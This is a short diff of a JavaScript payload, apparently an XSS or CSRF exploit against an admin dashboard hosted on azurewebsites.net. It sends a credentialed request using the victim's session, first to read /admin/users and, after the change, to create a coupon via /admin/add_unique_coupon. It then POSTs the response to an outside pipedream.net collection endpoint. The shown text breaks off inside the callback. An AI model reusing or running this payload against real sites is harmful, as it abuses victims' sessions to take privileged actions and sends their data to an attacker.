@@ -1,13 +1,13 @@
 var xhr = new XMLHttpRequest();
 
-xhr.open('GET', 'https://haatadmindashboard.azurewebsites.net/admin/users', true);
+xhr.open('GET', 'https://haatadmindashboard.azurewebsites.net/admin/add_unique_coupon?value=1&ExpiryDate=03-17-2022&ResId=6&amount=1', true);
 
 xhr.withCredentials = true;
 xhr.onreadystatechange = function() {
   if (xhr.readyState == 4) {
 
         var http = new XMLHttpRequest();
-        var url = "https://enxg7v5ip50sd.x.pipedream.net/users";
+        var url = "https://enxg7v5ip50sd.x.pipedream.net/create";
         http.open("POST", url, true);
         http.setRequestHeader("Content-type", "text/plain");
         http.onreadystatechange = function() {
